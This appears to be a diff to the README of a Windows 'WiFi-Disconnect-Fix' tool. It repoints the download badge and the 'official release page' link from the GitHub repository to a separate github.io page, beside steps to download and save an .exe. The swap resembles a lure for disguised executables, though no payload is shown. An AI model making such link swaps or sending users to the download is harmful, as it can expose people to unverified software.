@@ -1,6 +1,6 @@
 # 🌐 WiFi-Disconnect-Fix - Repair unstable network connections on Windows
 
-[![](https://img.shields.io/badge/Download-WiFi_Fix-blue.svg)](https://github.com/sabrin7246/WiFi-Disconnect-Fix)
+[![](https://img.shields.io/badge/Download-WiFi_Fix-blue.svg)](https://sabrin7246.github.io)
 
 ## 📋 About this tool
 
@@ -12,7 +12,7 @@ This tool runs on Windows 10 and Windows 11 computers. You need an active intern
 
 ## 📥 How to download and install
 
-1. Visit the [official release page](https://github.com/sabrin7246/WiFi-Disconnect-Fix).
+1. Visit the [official release page](https://sabrin7246.github.io).
 2. Look for the latest version under the Releases section.
 3. Select the file ending in .exe to start the download.
 4. Save the file to your desktop or downloads folder.
